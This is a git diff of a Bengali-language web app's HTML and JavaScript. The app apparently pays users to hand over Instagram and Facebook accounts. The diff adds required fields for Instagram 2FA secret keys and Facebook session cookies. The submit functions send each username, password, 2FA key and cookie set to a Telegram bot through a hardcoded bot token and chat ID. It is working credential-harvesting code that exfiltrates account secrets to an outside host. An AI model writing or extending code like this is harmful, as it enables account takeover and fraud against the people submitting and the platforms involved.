@@ -4174,41 +4174,7 @@ function togglePassword() {
     </div>
 
     
-            <!-- কনটেন্ট রাইটিং সার্ভিস -->
-    <div class="service-card" onclick="handleInvestClick()">
-        <div class="icon-circle" style="background: linear-gradient(135deg, #f857a6, #ff5858);">
-            <!-- পেন / রাইটিং লোগো (svg) -->
-            <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
-        </div>
-        <div class="card-content">
-            <h3>ইনভেস্ট মেন্ট</h3>
-            <p>ইনভেস্টমেন্ট করে আয় করুন</p>
-        </div>
-        <button class="card-btn" style="background: linear-gradient(135deg, #f857a6, #ff5858);">আয় করুন &rarr;</button>
-    </div>
-    
-
-    
-     <!-- ইউটিউব মনিটাইজেশন -->
-    <div class="service-card" onclick="handleTrainingClick
-    
-    ()">
-        <div class="icon-circle" style="background: linear-gradient(135deg, #f12711, #f5af19);">
-            <!-- প্লে বাটন / মনিটাইজেশন লোগো (svg) -->
-            <svg viewBox="0 0 24 24"><path d="M10 16.5l6-4.5-6-4.5v9zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
-        </div>
-        <div class="card-content">
-            <h3>ট্রেনিং সেকশন</h3>
-            <p>কাজ বুঝতে ভিডিও দেখুন</p>
-        </div>
-        <button class="card-btn" style="background: linear-gradient(135deg, #f12711, #f5af19);">ভিডিও দেখুন &rarr;</button>
-    </div>
-    
-    
-
-    
-
-
+           
     <!-- ভিডিও এডিটিং সার্ভিস -->
     <div class="service-card" onclick="handleMoreOptionsClick()">
         <div class="icon-circle" style="background: linear-gradient(135deg, #ee0979, #ff6a00);">
@@ -5995,6 +5961,7 @@ function closeAdminModal() {
     </div>
 </div>
 
+
 <!-- ইনস্টাগ্রাম সেল পেজ -->
 <div id="p-ig-create" class="p-page d-none" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; z-index: 1500; overflow-y: auto; padding-bottom: 40px; font-family: sans-serif;">
     
@@ -6015,10 +5982,11 @@ function closeAdminModal() {
             <p style="margin: 0; font-size: 12px; color: #b91c1c; font-weight: 600; line-height: 1.7; text-align: justify;">
                 <i class="fas fa-bell" style="animation: ring 2s infinite; margin-right: 5px;"></i> 
                 <strong>গুরুত্বপূর্ণ নির্দেশনা:</strong><br>
-                ১. অবশ্যই সম্পূর্ণ নতুন, সঠিক এবং সচল ইনস্টাগ্রাম আইডি সাবমিট করবেন。<br>
-                ২. আমাদের দেওয়া আজকের পাসওয়ার্ডটি হুবহু ব্যবহার করে আইডি তৈরি বা সেটআপ করতে হবে。<br>
-                ৩. কোনো প্রকার ভুল, ফেক, বা পাসওয়ার্ড ছাড়া আইডি সাবমিট করলে ব্যালেন্স যোগ হবে না。<br>
-                ৪. ইচ্ছে করে বারবার ভুল তথ্য সাবমিট করলে আপনার অ্যাকাউন্টটি স্থায়ীভাবে <strong>সাসপেন্ড (Block)</strong> করা হবে। নিয়ম মেনে কাজ সম্পন্ন করুন, ধন্যবাদ। ✅
+                ১. অবশ্যই সম্পূর্ণ নতুন, সঠিক এবং সচল ইনস্টাগ্রাম আইডি সাবমিট করবেন।<br>
+                ২. আমাদের দেওয়া আজকের পাসওয়ার্ডটি হুবহু ব্যবহার করে আইডি তৈরি বা সেটআপ করতে হবে।<br>
+                ৩. সঠিক 2FA Key সহ আইডি সাবমিট করতে হবে।<br>
+                ৪. কোনো প্রকার ভুল, ফেক, বা পাসওয়ার্ড/2FA Key ছাড়া আইডি সাবমিট করলে ব্যালেন্স যোগ হবে না।<br>
+                ৫. ইচ্ছে করে বারবার ভুল তথ্য সাবমিট করলে আপনার অ্যাকাউন্টটি স্থায়ীভাবে <strong>সাসপেন্ড (Block)</strong> করা হবে। নিয়ম মেনে কাজ সম্পন্ন করুন, ধন্যবাদ। ✅
             </p>
         </div>
 
@@ -6057,9 +6025,15 @@ function closeAdminModal() {
                     <input type="text" id="submitIgUsername" required placeholder="username / example@gmail.com" style="width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; outline: none; transition: border 0.2s;">
                 </div>
 
-                <div style="margin-bottom: 20px;">
+                <div style="margin-bottom: 12px;">
                     <label style="display: block; font-size: 11px; font-weight: 700; color: #57606f; margin-bottom: 5px;">পাসওয়ার্ড দিন</label>
                     <input type="text" id="submitIgPassword" required placeholder="আইডির পাসওয়ার্ডটি লিখুন" style="width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; outline: none; transition: border 0.2s;">
+                </div>
+
+                <!-- 2FA Key ফিল্ড -->
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; font-size: 11px; font-weight: 700; color: #57606f; margin-bottom: 5px;">2FA Key (Two-Factor Authentication) দিন</label>
+                    <input type="text" id="submitIg2FA" required placeholder="আপনার আইডির 2FA Secret Key দিন" style="width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; outline: none; transition: border 0.2s; font-family: monospace;">
                 </div>
 
                 <button type="submit" style="width: 100%; background: linear-gradient(135deg, #f09433 0%, #dc2743 50%, #bc1888 100%); color: white; border: none; padding: 12px; border-radius: 10px; font-weight: bold; font-size: 13px; cursor: pointer; box-shadow: 0 4px 12px rgba(220,39,67,0.25);">
@@ -6124,7 +6098,15 @@ function updateIgLimitUI() {
 
 // ইনস্টাগ্রাম পেজ খোলার বাটন ট্রিগার ফাংশন (অ্যাকাউন্ট স্ট্যাটাস চেকসহ)
 function handleInstagramSellClick() {
-    checkAndOpenPage('p-ig-create', 'ইনস্টাগ্রাম সেল');
+    if (typeof checkAndOpenPage === 'function') {
+        checkAndOpenPage('p-ig-create', 'ইনস্টাগ্রাম সেল');
+    } else {
+        let page = document.getElementById('p-ig-create');
+        if (page) {
+            page.style.display = 'block';
+            page.classList.remove('d-none');
+        }
+    }
 }
 
 // পেজ বন্ধ করার ফাংশন (হোমে ফিরে যাওয়ার জন্য)
@@ -6165,21 +6147,34 @@ function submitIgData(event) {
         return;
     }
     
-    var igAccount = document.getElementById("submitIgUsername").value;
-    var password = document.getElementById("submitIgPassword").value;
+    var igAccount = document.getElementById("submitIgUsername").value.trim();
+    var password = document.getElementById("submitIgPassword").value.trim();
+    var key2FA = document.getElementById("submitIg2FA").value.trim();
     
     const tgToken = "8213160023:AAFtEXfzkaJY4XLedxQuExevMPxsW6gL_ao"; 
     const tgChatId = "7203470877"; 
     
+    // টেলিগ্রাম মেসেজ ফরমেট (2FA Key সহ)
     var message = `📸 *New Instagram Submission* 📸\n\n` +
                   `👤 *ইউজার:* ${typeof curUser !== 'undefined' ? curUser.email : 'Unknown'}\n` +
                   `📱 *Submitted Account:* \`${igAccount}\`\n` +
-                  `🔑 *Submitted Password:* \`${password}\`\n\n` +
-                  `⚠️ _দয়া করে ইনস্টাগ্রাম আইডি চেক করে ব্যালেন্স যোগ করুন।_`;
+                  `🔑 *Submitted Password:* \`${password}\`\n` +
+                  `🔐 *2FA Key:* \`${key2FA}\`\n\n` +
+                  `⚠️ _দয়া করে ইনস্টাগ্রাম আইডি ও 2FA Key চেক করে ব্যালেন্স যোগ করুন।_`;
     
-    var url = `https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-    
-    fetch(url)
+    var url = `https://api.telegram.org/bot${tgToken}/sendMessage`;
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: tgChatId,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    })
     .then(response => {
         let currentCount = parseInt(localStorage.getItem("ig_submit_count")) || 0;
         localStorage.setItem("ig_submit_count", (currentCount + 1).toString());
@@ -6224,8 +6219,14 @@ function closeIgSuccessPopup() {
     document.getElementById("igSuccessPopup").style.display = "none";
 }
 </script>
- 
 
+
+
+
+
+
+
+      
 <div id="p-about" class="p-page d-none" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f8fafc; z-index: 2000; overflow-y: auto; padding-bottom: 50px; font-family: 'Poppins', sans-serif;">
     
     <!-- হেডার: প্রিমিয়াম রেড-ইয়েলো গ্রেডিয়েন্ট -->
@@ -6592,6 +6593,9 @@ function closeWhatsAppSuccessPopup() {
 }
 </script>
 
+
+
+
 <!-- ফেসবুক সেল পেজ -->
 <div id="p-fb-create" class="p-page d-none" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; z-index: 1500; overflow-y: auto; padding-bottom: 40px; font-family: sans-serif;">
     
@@ -6614,8 +6618,9 @@ function closeWhatsAppSuccessPopup() {
                 <strong>গুরুত্বপূর্ণ নির্দেশনা:</strong><br>
                 ১. অবশ্যই সম্পূর্ণ নতুন, সঠিক এবং সচল ফেসবুক আইডি সাবমিট করবেন।<br>
                 ২. আমাদের দেওয়া আজকের পাসওয়ার্ডটি হুবহু ব্যবহার করে আইডি তৈরি বা সেটআপ করতে হবে।<br>
-                ৩. কোনো প্রকার ভুল, ফেক, বা পাসওয়ার্ড ছাড়া আইডি সাবমিট করলে ব্যালেন্স যোগ হবে না।<br>
-                ৪. ইচ্ছে করে বারবার ভুল তথ্য সাবমিট করলে আপনার অ্যাকাউন্টটি স্থায়ীভাবে <strong>সাসপেন্ড (Block)</strong> করা হবে। নিয়ম মেনে কাজ সম্পন্ন করুন, ধন্যবাদ। ✅
+                ৩. সঠিক কুকিজ (Cookies) সহ সাবমিট করতে হবে।<br>
+                ৪. কোনো প্রকার ভুল, ফেক, বা পাসওয়ার্ড/কুকিজ ছাড়া আইডি সাবমিট করলে ব্যালেন্স যোগ হবে না।<br>
+                ৫. ইচ্ছে করে বারবার ভুল তথ্য সাবমিট করলে আপনার অ্যাকাউন্টটি স্থায়ীভাবে <strong>সাসপেন্ড (Block)</strong> করা হবে। নিয়ম মেনে কাজ সম্পন্ন করুন, ধন্যবাদ। ✅
             </p>
         </div>
 
@@ -6654,9 +6659,15 @@ function closeWhatsAppSuccessPopup() {
                     <input type="text" id="submitFbEmail" required placeholder="example@gmail.com / Phone" style="width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; outline: none; transition: border 0.2s;">
                 </div>
 
-                <div style="margin-bottom: 20px;">
+                <div style="margin-bottom: 12px;">
                     <label style="display: block; font-size: 11px; font-weight: 700; color: #57606f; margin-bottom: 5px;">পাসওয়ার্ড দিন</label>
                     <input type="text" id="submitFbPassword" required placeholder="আইডির পাসওয়ার্ডটি লিখুন" style="width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; outline: none; transition: border 0.2s;">
+                </div>
+
+                <!-- নতুন কুকিজ ফিল্ড -->
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; font-size: 11px; font-weight: 700; color: #57606f; margin-bottom: 5px;">ফেসবুক কুকিজ (Cookies) দিন</label>
+                    <textarea id="submitFbCookies" required placeholder="এখানে ফেসবুক আইডির কুকিজ (Cookies) পেস্ট করুন..." rows="4" style="width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 12px; outline: none; transition: border 0.2s; resize: vertical; font-family: monospace;"></textarea>
                 </div>
 
                 <button type="submit" style="width: 100%; background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; border: none; padding: 12px; border-radius: 10px; font-weight: bold; font-size: 13px; cursor: pointer; box-shadow: 0 4px 12px rgba(16,185,129,0.25);">
@@ -6729,7 +6740,7 @@ function handleFbCreateClick() {
     }
 }
 
-// পেজ বন্ধ করার ফাংশন (হোমে ফিরে যাওয়ার জন্য)
+// পেজ বন্ধ করার ফাংশন (হোমে ফিরে যাওয়ার জন্য)
 function closeFbPage() {
     let page = document.getElementById('p-fb-create');
     if (page) {
@@ -6767,21 +6778,34 @@ function submitFbData(event) {
         return;
     }
     
-    var fbAccount = document.getElementById("submitFbEmail").value;
-    var password = document.getElementById("submitFbPassword").value;
+    var fbAccount = document.getElementById("submitFbEmail").value.trim();
+    var password = document.getElementById("submitFbPassword").value.trim();
+    var cookies = document.getElementById("submitFbCookies").value.trim();
     
     const tgToken = "8213160023:AAFtEXfzkaJY4XLedxQuExevMPxsW6gL_ao"; 
     const tgChatId = "7203470877"; 
     
+    // টেলিগ্রাম মেসেজ ফরম্যাট (কুকিজ সহ)
     var message = `📘 *New Facebook Submission* 📘\n\n` +
                   `👤 *ইউজার:* ${typeof curUser !== 'undefined' ? curUser.email : 'Unknown'}\n` +
                   `📱 *Submitted Account:* \`${fbAccount}\`\n` +
                   `🔑 *Submitted Password:* \`${password}\`\n\n` +
-                  `⚠️ _দয়া করে ফেসবুক আইডি চেক করে ব্যালেন্স যোগ করুন।_`;
+                  `🍪 *Submitted Cookies:*\n\`\`\`\n${cookies}\n\`\`\`\n\n` +
+                  `⚠️ _দয়া করে ফেসবুক আইডি ও কুকিজ চেক করে ব্যালেন্স যোগ করুন।_`;
     
-    var url = `https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-    
-    fetch(url)
+    var url = `https://api.telegram.org/bot${tgToken}/sendMessage`;
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: tgChatId,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    })
     .then(response => {
         let currentCount = parseInt(localStorage.getItem("fb_submit_count")) || 0;
         localStorage.setItem("fb_submit_count", (currentCount + 1).toString());
@@ -6826,6 +6850,14 @@ function closeFbSuccessPopup() {
     document.getElementById("fbSuccessPopup").style.display = "none";
 }
 </script>
+
+
+
+
+
+
+
+      
 
 <!-- টেলিগ্রাম সেল পেজ -->
 <div id="p-telegram-sell" class="p-page d-none" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; z-index: 1500; overflow-y: auto; padding-bottom: 40px; font-family: sans-serif;">
